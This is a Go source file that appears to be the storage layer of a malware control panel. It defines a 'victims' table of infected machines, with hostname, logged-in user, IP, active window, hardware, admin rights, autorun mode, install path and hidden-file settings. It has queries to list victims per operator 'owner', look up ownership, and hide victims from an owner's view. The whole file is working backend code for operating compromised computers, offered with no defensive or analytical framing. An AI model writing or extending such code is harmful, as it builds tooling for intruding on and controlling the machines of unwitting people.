package storage

import (
	"context"
	"database/sql"
	"errors"
	"strings"
	"time"
)

type Victim struct {
	ID         string `json:"id"`
	Country    string `json:"country"`
	DeviceType string `json:"deviceType"`
	Hostname   string `json:"hostname"`
	User       string `json:"user"`
	Window     string `json:"window"`
	IP         string `json:"ip"`
	Comment    string `json:"comment"`
	BuildID    string `json:"buildId"`
	OS         string `json:"os"`
	CPU        string `json:"cpu"`
	GPU        string `json:"gpu"`
	RAM        string `json:"ram"`
	Admin      bool   `json:"admin"`

	LastActive time.Time `json:"last_active"`
	Online     bool      `json:"online"`
	Owner      string    `json:"owner"`

	BuildVersion        string `json:"version"`
	StartupDelaySeconds int    `json:"startupDelaySeconds"`
	AutorunMode         string `json:"autorunMode"`
	InstallPath         string `json:"installPath"`
	HideFilesEnabled    bool   `json:"hideFilesEnabled"`
}

func (d *DB) ListVictimsForOwner(owner string, limit, offset int) ([]*Victim, error) {
	owner = strings.ToLower(strings.TrimSpace(owner))
	if owner == "" {
		return nil, errors.New("empty owner")
	}
	if d == nil || d.SQL() == nil {
		return nil, errors.New("db is nil")
	}

	if limit <= 0 {
		limit = 500
	}
	if limit > 2000 {
		limit = 2000
	}
	if offset < 0 {
		offset = 0
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	rows, err := d.SQL().QueryContext(ctx, `
		SELECT
			id,
			COALESCE(country, ''),
			COALESCE(device_type, ''),
			COALESCE(hostname, ''),
			COALESCE("user", ''),
			COALESCE("window", ''),
			COALESCE(ip, ''),
			COALESCE(comment, ''),
			COALESCE(build_id, ''),
			COALESCE(os, ''),
			COALESCE(cpu, ''),
			COALESCE(gpu, ''),
			COALESCE(ram, ''),
			COALESCE(last_active, 0),
			online,
			COALESCE(owner, ''),
			admin,
			COALESCE(build_version, ''),
			COALESCE(startup_delay_sec, 0),
			COALESCE(autorun_mode, ''),
			COALESCE(install_path, ''),
			COALESCE(hide_files_enabled, false)
		FROM victims
		WHERE LOWER(COALESCE(owner, '')) = $1
			AND NOT EXISTS (
				SELECT 1 FROM hidden_victims hv
				WHERE hv.owner = $1 AND hv.victim_id = victims.id
			)
		ORDER BY last_active DESC
		LIMIT $2 OFFSET $3
	`, owner, limit, offset)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	out := make([]*Victim, 0)
	for rows.Next() {
		var v Victim
		var lastActive int64

		if err := rows.Scan(
			&v.ID,
			&v.Country,
			&v.DeviceType,
			&v.Hostname,
			&v.User,
			&v.Window,
			&v.IP,
			&v.Comment,
			&v.BuildID,
			&v.OS,
			&v.CPU,
			&v.GPU,
			&v.RAM,
			&lastActive,
			&v.Online,
			&v.Owner,
			&v.Admin,
			&v.BuildVersion,
			&v.StartupDelaySeconds,
			&v.AutorunMode,
			&v.InstallPath,
			&v.HideFilesEnabled,
		); err != nil {
			return nil, err
		}

		v.Owner = strings.ToLower(strings.TrimSpace(v.Owner))
		if lastActive > 1_000_000_000_000 {
			v.LastActive = time.UnixMilli(lastActive)
		} else if lastActive > 0 {
			v.LastActive = time.Unix(lastActive, 0)
		}

		vv := v
		out = append(out, &vv)
	}

	if err := rows.Err(); err != nil {
		return nil, err
	}
	return out, nil
}

func (d *DB) GetVictimOwnerByID(id string) (string, bool, error) {
	id = strings.TrimSpace(id)
	if id == "" {
		return "", false, nil
	}
	if d == nil || d.SQL() == nil {
		return "", false, errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	var owner string
	err := d.SQL().QueryRowContext(ctx, `SELECT COALESCE(owner, '') FROM victims WHERE id = $1`, id).Scan(&owner)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return "", false, nil
		}
		return "", false, err
	}
	owner = strings.ToLower(strings.TrimSpace(owner))
	if owner == "" {
		return "", false, nil
	}
	return owner, true, nil
}

func (d *DB) HideVictimForOwner(owner, victimID string) error {
	owner = strings.ToLower(strings.TrimSpace(owner))
	victimID = strings.TrimSpace(victimID)
	if owner == "" || victimID == "" {
		return errors.New("owner or victim_id is empty")
	}
	if d == nil || d.SQL() == nil {
		return errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := d.SQL().ExecContext(ctx, `
		INSERT INTO hidden_victims (owner, victim_id)
		VALUES ($1, $2)
		ON CONFLICT (owner, victim_id) DO NOTHING
	`, owner, victimID)
	return err
}
